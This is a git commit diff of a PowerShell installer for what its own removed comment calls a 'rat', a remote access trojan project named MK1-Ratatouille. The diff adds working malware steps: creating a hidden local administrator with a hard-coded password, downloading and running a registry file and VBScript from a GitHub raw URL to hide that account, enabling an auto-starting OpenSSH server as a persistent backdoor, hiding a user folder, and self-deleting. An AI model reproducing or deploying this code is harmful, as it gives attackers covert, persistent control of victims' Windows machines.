891303b32e8e4094d96c53111eb08e5b23a1561d
CHEPHYTY <soumyahembra123@gmail.com>
2024-05-21 20:14:13 +0530

    day2 try 4

--- files/installer.ps1
+++ files/installer.ps1
@@ -1,12 +1,9 @@
-# builds resource for rat
-# created by: CHEPHYTY
-
-#random string for directories
-
+# Function to generate a random string for directory names
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
 }
-# create local admin for rat
+
+# Function to create a local admin account
 function create_account {
     [CmdletBinding()]
     param (
@@ -16,52 +13,75 @@ function create_account {
     begin {
     }
     process {
-        New-LocalGroup "$uname" -Password $pword -FullName "$uname" -Description "Temporary local admin"
-        Write-Verbose "$uname local user created" 
-        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
-        # Write-Verbose "$uname added to the local adminisrator group"
+        New-LocalUser -Name $uname -Password $pword -FullName $uname -Description "Temporary local admin" -AccountNeverExpires
+        Write-Verbose "$uname local user created"
+        Add-LocalGroupMember -Group "Administrators" -Member $uname
+        Write-Verbose "$uname added to the local administrators group"
     }
     end {
     }
 }
 
-#create admin user 
+# Create admin user
 $uname = random_text
-$pword = (ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force)
+$pword = ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force
 create_account -uname $uname -pword $pword
 
-## variables
+# Variables
 $wd = random_text
 $path = "$env:temp\$wd"
 $initial_dir = $PWD.Path
 
-# goto temp, make working directory
+# Go to temp, make working directory
 mkdir $path
 Set-Location $path
-# Set-Content -Path "poc.txt" -Value ""
 
+# Registry and VBScript to hide local admin
+$regUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg'
+$vbsUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs'
 
-# registry to hide local admin
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg' -OutFile "wrev.reg"
+try {
+    Invoke-WebRequest -Uri $regUrl -OutFile "wrev.reg"
+    Invoke-WebRequest -Uri $vbsUrl -OutFile "calty.vbs"
+}
+catch {
+    Write-Error "Failed to download files from $regUrl or $vbsUrl"
+}
 
-# visual basic script to register the regisry
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs' -OutFile "calty.vbs"
+# Enable persistent SSH
+try {
+    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    Start-Service sshd
+    Set-Service -Name sshd -StartupType 'Automatic'
+    Write-Verbose "SSH service enabled and set to start automatically"
+}
+catch {
+    Write-Error "Failed to enable or start SSH service. Make sure the script is run with elevated permissions."
+}
 
+# Install the registry changes
+try {
+    .\wrev.reg
+    .\calty.vbs
+}
+catch {
+    Write-Error "Failed to execute registry or VBScript"
+}
 
-# enabling persistent ssh
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Start-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
-# Get-NetFirewallRule -Name *ssh*
+# Hide the onlyrat user
+try {
+    cd C:\Users
+    attrib.exe +h +s +r onlyrat
+}
+catch {
+    Write-Error "Failed to hide the user directory"
+}
 
-
-# install the registry
-./wrev.reg; ./calty
-
-
-#hide onlyrat user 
-cd C:\Users
-attrib.exe +h +s +r onlyrat
 # Clean up and self delete
 Set-Location $initial_dir
-Remove-Item -Path ".\installer.ps1" -Force
+try {
+    Remove-Item -Path "$MyInvocation.MyCommand.Path" -Force
+}
+catch {
+    Write-Error "Failed to self-delete the script"
+}
